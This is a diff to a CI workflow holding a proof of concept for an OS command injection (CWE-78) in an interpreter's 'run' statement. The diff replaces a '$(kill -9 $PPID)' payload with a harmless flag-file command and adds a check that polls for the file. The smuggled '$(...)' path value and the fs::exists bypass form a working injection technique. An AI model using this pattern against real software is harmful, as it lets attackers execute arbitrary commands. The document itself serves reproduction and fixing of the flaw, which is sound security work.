@@ -30,23 +30,28 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Restore build
+      - name: Build interpreter
         run: |
           cmake -S interpreter -B /tmp/msla-build
           cmake --build /tmp/msla-build -j$(nproc)
 
       - name: Create trap directory (literal $() name bypasses fs::exists)
-        run: mkdir -p '/tmp/$(kill -9 $PPID)'
+        run: mkdir -p '/tmp/$(touch /tmp/msla_poc_flag && sync)'
 
       - name: Create PoC script
         run: |
           cat > /tmp/poc.msla << 'POCEOF'
-          run "/tmp/$(kill -9 $PPID)"
+          run "/tmp/$(touch /tmp/msla_poc_flag && sync)"
           POCEOF
 
-      - name: Run PoC - reproduce CWE-78 crash
+      - name: Run PoC - reproduce CWE-78 command injection
         shell: bash
         run: |
+          # system() uses clone3(CLONE_VFORK), and background & causes
+          # $(cmd) to run in a child process AFTER system() returns.
+          # We poll for the flag file with a timeout.
+          rm -f /tmp/msla_poc_flag
+
           set +e
           /tmp/msla-build/msla_interpreter /tmp/poc.msla 2>&1
           exit_code=$?
@@ -56,22 +61,36 @@ jobs:
           echo "============================================"
           echo "  CWE-78 PoC - OS Command Injection"
           echo "============================================"
+
+          # Poll for flag file (background command race)
+          found=0
+          for i in $(seq 1 15); do
+            if [ -f /tmp/msla_poc_flag ]; then
+              found=1
+              break
+            fi
+            sleep 1
+          done
+
           echo ""
 
-          if [ $exit_code -eq 137 ]; then
+          if [ "$found" = "1" ]; then
             echo "  ✅ VULNERABILITY CONFIRMED"
-            echo "     Interpreter killed by SIGKILL (exit $exit_code)"
+            echo "     Command injection via 'run' statement"
+            echo "     Flag file created: $(cat /tmp/msla_poc_flag || echo 'exists')"
             echo ""
             echo "  Attack chain:"
-            echo "    1. run \"/tmp/\$(...)\" passes path to std::system()"
-            echo "    2. Shell expands \$(kill -9 \$PPID) as command substitution"
-            echo "    3. \$PPID = interpreter PID, kill -9 kills the process"
-            echo "    4. fs::exists() bypassed: checks literal path on disk"
+            echo "    1. run \"<path>\" passes user-controlled path to std::system()"
+            echo "    2. path = /tmp/\$(touch /tmp/flag && sync)"
+            echo "    3. fs::exists() checks literal path on disk (bypassed via mkdir)"
+            echo "    4. Shell expands \$(...) as command substitution"
+            echo "    5. Arbitrary command executes inside interpreter process"
             echo ""
             echo "  Location: interpreter/interpreter.cpp:670-671"
             echo "  Fix:      use execv() or validate path with strict allowlist"
           else
-            echo "  ❌ NOT REPRODUCED (exit $exit_code, expected 137)"
-            echo "     The vulnerability may have been fixed."
+            echo "  ❌ NOT REPRODUCED"
+            echo "     Expected flag file /tmp/msla_poc_flag to exist, but not found"
+            echo "     interpreter exited with code $exit_code"
             exit 1
           fi
